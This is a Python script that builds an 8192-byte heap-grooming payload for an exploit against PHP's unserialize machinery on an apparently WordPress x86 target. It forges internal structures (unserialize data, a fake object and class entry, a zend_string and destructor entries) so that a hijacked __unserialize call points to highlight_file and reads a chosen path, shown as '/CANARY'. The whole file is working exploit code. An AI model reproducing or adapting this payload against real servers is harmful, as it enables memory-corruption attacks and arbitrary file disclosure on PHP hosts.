#!/usr/bin/env python3
"""groom.py — build the 8192B consumer groom value (fake php_unserialize_data
+ fake object/ce + zend_string + fake var_dtor_entries) for the wp-x86 lane.

Layout (see glm4/notes.md cb4 v2):
  +0    d.last        = L2            (zeroed bss var_entries)
  +8    d.first_dtor  = LG = base+4096 (groom entries, pre-forged)
  +16   d.last_dtor   = LW = &BG(unserialize).data - 20
  +24   allowed_classes=0  +32 ref_props=0  +40 cur_depth=0  +48 max_depth=100
  +72   V = C: *(V+16)=V (self-ce), *(V+352)=F_rt
  +256  zstr zend_string {refcount=100, gc.type=6, h=0, len, "/CANARY"}
  +4096 LG entries: used_slots=2, next=0,
        data[0]={V, IS_LONG(4), u2=2}, data[1]={zstr_ptr, 0x106, 0}
  rest zero; total exactly 8192 bytes.
"""
import struct

F_VA = 0xef8f50          # zif_highlight_file fake func, file VA
BSS_VA = 0xf20000        # L2 area (zeroed bss)


def build_payload(base, bg_data_addr, bias):
    lw = bg_data_addr - 20
    f_rt = bias + F_VA
    l2 = bias + BSS_VA
    lg = base + 4096
    v = base + 72
    zstr = base + 256
    buf = bytearray(8192)

    def q(off, val):
        struct.pack_into("<Q", buf, off, val)

    def d(off, val):
        struct.pack_into("<I", buf, off, val)

    q(0, l2)             # d.last
    q(8, lg)             # d.first_dtor
    q(16, lw)            # d.last_dtor
    q(24, 0)             # allowed_classes (NULL = unrestricted)
    q(32, 0)             # ref_props
    q(40, 0)             # cur_depth
    q(48, 100)           # max_depth
    q(56, 0)             # entries.used_slots (unused; last != &entries)
    q(64, 0)             # entries.next (read by var_destroy)
    # V = C region
    q(72 + 16, v)        # *(V+16) = C = V  (obj->ce)
    q(72 + 352, f_rt)    # *(C+352) = F    (ce->__unserialize)
    # zend_string "/CANARY"
    d(256, 100)          # gc.refcount
    d(260, 6)            # gc.type_flags/u.type_info: IS_STRING (non-persistent)
    q(264, 0)            # h
    q(272, 7)            # len
    buf[280:287] = b"/CANARY"
    buf[287] = 0
    # fake var_dtor_entries at LG
    d(4096, 2)           # used_slots
    q(4104, 0)           # next
    # data[0] = {V, IS_LONG, u2=2}
    q(4112, v)
    d(4120, 4)           # type_info IS_LONG -> i_zval_ptr_dtor no-op
    d(4124, 2)           # u2 = VAR_UNSERIALIZE_FLAG
    # data[1] = {zstr, IS_STRING|refcounted, 0}
    q(4128, zstr)
    d(4136, 0x106)
    d(4140, 0)
    return bytes(buf)


if __name__ == "__main__":
    import sys
    base = int(sys.argv[1], 0)
    bgd = int(sys.argv[2], 0)
    bias = int(sys.argv[3], 0)
    p = build_payload(base, bgd, bias)
    sys.stdout.buffer.write(p)
